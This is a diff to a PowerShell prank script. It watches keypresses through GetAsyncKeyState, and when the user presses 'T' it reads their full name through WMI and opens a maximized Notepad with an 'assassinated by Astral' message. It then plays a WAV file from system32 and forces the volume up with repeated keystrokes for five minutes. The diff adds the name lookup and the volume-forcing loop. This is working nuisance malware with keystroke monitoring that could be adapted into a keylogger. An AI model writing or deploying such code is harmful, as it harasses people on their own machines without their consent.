@@ -38,12 +38,13 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
         # get current key state
         $state = $API::GetAsyncKeyState($ascii)
 
-        # is key pressed?
-        # -32767 is ASCII CTRL+C code (C=67)
+        # is key pressed? (-32767 is keypress code)
         if ($state -eq -32767) {
             $chr = [char]$ascii
             if ($chr -eq 'T') {
-                $death_msg = "$env:UserName, you've been assassinated by Astral!`nYou pressed the 'T' key... T for Trap!`nPlaying Ride now........ "
+                $fname = ($(Get-WMIObject -class Win32_UserAccount | select fullname).fullname);
+                $fname = [string]::join("",($fname.Split("`n")));
+                $death_msg = "$fname, you've been assassinated by Astral!`nYou pressed the 'T' key... T for Trap!`nHave fun playing the Ride now........ "
                 $death_msg | Out-File -FilePath $Path
                 $run = $false;
             }
@@ -53,16 +54,27 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
   }
   finally
   {
+    # Start Notepad, maximized, with death message
     Start-Job -ScriptBlock { 
         $Path = "$env:temp\message.txt";
         Start-Sleep -Seconds 3;
         Start-Process notepad -WindowStyle maximized -ArgumentList $Path
     };
 
+    # play the ride
     Start-Job -ScriptBlock { 
         $play = New-Object System.Media.SoundPlayer;
         $play.SoundLocation = 'C:\WINDOWS\system32\ride.wav';
         $play.PlaySync()
+    };
+
+    # set volume to full, on repeat (for 5 minutes (300k ms))
+    Start-Job -ScriptBlock {
+        $obj = new-object -com wscript.shell
+        for ($t = 0; $t -lt 300000; $t+=10) {
+            $obj.SendKeys([char]175);
+            Start-Sleep -Milliseconds 10;
+        }
     };
     
   }
